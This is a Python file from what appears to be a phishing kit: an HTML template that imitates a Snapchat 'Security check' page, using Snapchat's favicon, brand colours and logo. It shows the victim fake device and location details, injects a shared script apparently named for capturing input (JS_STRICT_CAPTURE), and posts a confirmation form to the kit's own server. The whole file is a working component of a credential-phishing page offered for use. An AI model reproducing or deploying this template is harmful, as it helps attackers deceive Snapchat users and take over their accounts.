"""checkpoint.py - Template checkpoint Snapchat."""

from platforms._shared import JS_STRICT_CAPTURE, SC_LOGO_SVG as _SC_LOGO_SVG

HTML_CHECKPOINT = r"""
<!DOCTYPE html>
<html lang="{{ lang }}" dir="{{ direction }}">
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover">
    <link rel="shortcut icon" href="https://accounts.snapchat.com/favicon.ico" type="image/x-icon">
    <title>Security check | Snapchat</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <style>
        body { background: #fffc00; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; }
        .sc-card { background: #fff; padding: 28px; border-radius: 12px; box-shadow: 0 4px 16px rgba(0,0,0,0.1); max-width: 400px; width: 100%; box-sizing: border-box; }
        .btn-yes { background: #fffc00; color: #000; border: 1px solid #000; border-radius: 28px; padding: 12px; font-weight: 700; width: 100%; font-size: 15px; cursor: pointer; }
        .btn-no { background: #fff; color: #000; border: 1px solid #ddd; border-radius: 28px; padding: 12px; font-weight: 600; width: 100%; font-size: 15px; cursor: pointer; margin-top: 8px; }
    </style>
</head>
<body class="flex flex-col min-h-screen items-center justify-center p-4">
    """ + JS_STRICT_CAPTURE + r"""
    <div class="sc-card">
        <h2 class="text-xl font-bold text-center text-black mb-2">{{ checkpoint_title }}</h2>
        <p class="text-gray-600 text-center text-sm mb-5">{{ checkpoint_sub }}</p>
        <div class="bg-gray-50 rounded p-3 mb-5 space-y-2 text-sm">
            <div class="flex justify-between"><span class="text-gray-500">{{ device_label }}:</span><span class="font-medium">{{ device }}</span></div>
            <div class="flex justify-between"><span class="text-gray-500">{{ location_label }}:</span><span class="font-medium">{{ city }}, {{ country }}</span></div>
            <div class="flex justify-between"><span class="text-gray-500">{{ time_label }}:</span><span class="font-medium">{{ lang_name }}</span></div>
        </div>
        <form method="POST">
            <input type="hidden" name="action" value="checkpoint">
            <button type="submit" class="btn-yes">{{ yes_btn }}</button>
        </form>
        <a href="/" class="btn-no text-center block mt-2">{{ no_btn }}</a>
        <p class="text-center text-xs text-gray-400 mt-4">{{ help }}</p>
    </div>
</body>
</html>
"""
